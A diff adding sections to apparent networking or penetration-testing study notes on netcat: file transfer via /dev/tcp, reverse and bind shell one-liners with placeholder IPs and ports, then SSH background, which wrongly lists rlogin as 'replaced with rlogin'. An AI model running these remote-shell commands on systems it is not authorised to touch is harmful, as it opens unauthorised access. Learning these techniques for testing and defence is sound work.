@@ -700,5 +700,41 @@ Writes the output to listener1 and listener2 through the named pipe
       nc 192.168.1.1 3333 < test  (the one sending the info via named pipe)
 
      
+     
+  FILE TRANSFER WITH /DEV/TCP
+On the receiving box:
+nc -l -p 1111 > file.txt
+
+On the sending box:
+cat file.txt > /dev/tcp/10.2.0.2/1111
+
+This method is useful for host that does not have NETCAT available.
  
+ 
+ 
+REVERSE SHELL USING NETCAT
+When shelled into the remote host using -c :
+nc -c /bin/sh <your ip> <any unfiltered port>
+
+You could even pipe BASH through NETCAT.
+/bin/sh | nc <your ip> <any unfiltered port>
+
+Then listen for the shell.
+nc -l -p <same unfiltered port> -vvv
+
+You can also listen using the -e with NETCAT.
+nc -l -p <any unfiltered port> -e /bin/bash
+ 
+ 
+ --------------------------------------------------------------------------------------------------------------------------------------------------
+ SSH
+Various Implementations (v1 and v2)
+Provides authentication, encryption, and integrity.
+Allows remote terminal sessions
+Used for tunneling
+Created as a secure replacement for Berkeley Remote commands:
+rsh - replaced with ssh, provides a channel for running a shell on a remote computer.
+rlogin - replaced with rlogin, provides remote login capability.
+rcp - replaced with scp for secure file transfer
+sftp (not a unix r command replacement) - creates remote directory listing and file transfer capability over SSH
  
